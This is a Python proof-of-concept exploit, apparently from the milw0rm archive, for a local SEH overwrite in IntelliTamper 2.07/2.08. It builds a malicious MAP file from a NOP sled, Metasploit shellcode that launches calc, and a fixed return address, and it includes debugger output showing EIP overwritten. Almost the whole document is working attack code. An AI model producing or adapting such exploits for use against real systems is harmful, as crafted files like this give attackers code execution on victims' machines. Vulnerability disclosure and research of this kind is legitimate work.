#!/usr/bin/python
# IntelliTamper 2.07/2.08  (MAP File) 0-day Local SEH Overwrite Exploit
# Bug discovered by cN4phux <cN4phux@gmail.com>
# Tested on: IntelliTamper 2.07/2.08 / win32 SP3 FR
# Shellcode: Windows Execute Command (calc) <metasploit.com>
# Here's the debugger output like what u see, the EIP overwritten & attempt to read from address 41414141 so the prog must be crashz . .
# EAX 0015B488 ECX 00123400 EDX 00123610
# EBX 00000000 ESP 00123604 EBP 00128B78
# ESI 00000000 EDI 00123A64 EIP 41414141
#Vive les Algeriens & greatz to friend's : me (XD) Heurs, Djug , Blub , His0k4 , Knuthy , Moorish , Ilyes ,
#Here's the the Poc :


import sys
map_theader = ((("\x23\x23\x23\x20\x53\x49\x54\x45\x4D"
                 "\x41\x50\x31\x20\x49\x4E\x54\x45\x4C"
                 "\x4C\x49\x54\x41\x4D\x50\x45\x52\x0D\x0A"))) #junk

map_iheader = "\x46\x49\x4C\x45\x23\x23"

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode = ((("\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"
               "\x91\xc1\x60\x83\xeb\xfc\xe2\xf4\x39\x79\x85\x60\xc5\x91\x4a\x25"
               "\xf9\x1a\xbd\x65\xbd\x90\x2e\xeb\x8a\x89\x4a\x3f\xe5\x90\x2a\x29"
               "\x4e\xa5\x4a\x61\x2b\xa0\x01\xf9\x69\x15\x01\x14\xc2\x50\x0b\x6d"
               "\xc4\x53\x2a\x94\xfe\xc5\xe5\x64\xb0\x74\x4a\x3f\xe1\x90\x2a\x06"
               "\x4e\x9d\x8a\xeb\x9a\x8d\xc0\x8b\x4e\x8d\x4a\x61\x2e\x18\x9d\x44"
               "\xc1\x52\xf0\xa0\xa1\x1a\x81\x50\x40\x51\xb9\x6c\x4e\xd1\xcd\xeb"
               "\xb5\x8d\x6c\xeb\xad\x99\x2a\x69\x4e\x11\x71\x60\xc5\x91\x4a\x08"
               "\xf9\xce\xf0\x96\xa5\xc7\x48\x98\x46\x51\xba\x30\xad\x61\x4b\x64"
               "\x9a\xf9\x59\x9e\x4f\x9f\x96\x9f\x22\xf2\xa0\x0c\xa6\x91\xc1\x60"))); # 160 byte

header_nop = "\x90"*327

retn = "\x7b\x34\x12\x00"+".html\n" # EIP value with 4 byte fix

exploit = map_theader + map_iheader + header_nop + shellcode + retn
headers = open("0x.map", "w")
headers.write(exploit)
headers.close()

print "\nFile created successfully !";
print "\n\cN4phux.";

# milw0rm.com [2008-12-28]